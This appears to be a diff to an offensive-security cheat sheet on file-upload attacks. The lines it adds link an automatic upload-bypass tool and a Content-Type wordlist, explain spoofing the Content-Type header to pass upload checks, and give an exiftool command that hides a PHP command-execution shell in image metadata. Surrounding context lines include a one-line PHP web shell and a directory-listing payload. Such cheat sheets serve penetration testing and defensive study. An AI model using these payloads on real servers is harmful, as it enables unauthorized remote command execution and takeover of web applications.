@@ -725,6 +725,10 @@ payalod=<?php $dir='.'; $file = scandir($dir); print_r($file); ?>
 >[github waf](https://github.com/0xInfection/Awesome-WAF)
 >
 # shellupload
+[automatic shell upload](https://github.com/sAjibuu/Upload_Bypass)
+
+>bypass Bypass Content-Type checks by setting the value of the Content-Type header to: image/png , text/plain link
+[Content-Type wordlist:](https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/web/content-type.txt)
 >link to web shell
 ```
 <?php system($_GET['cmd']);?
@@ -739,6 +743,10 @@ onload="window.location='http://www.example.com'"/
 xmlns="http://www.w3.org/2000/svg">
 </svg>
 </code>
+```
+>metadata:
+```
+exiftool -Comment="<?php echo 'Command:'; if($_POST){system($_POST['cmd']);} __halt_compiler();" img.jpg
 ```
 
 
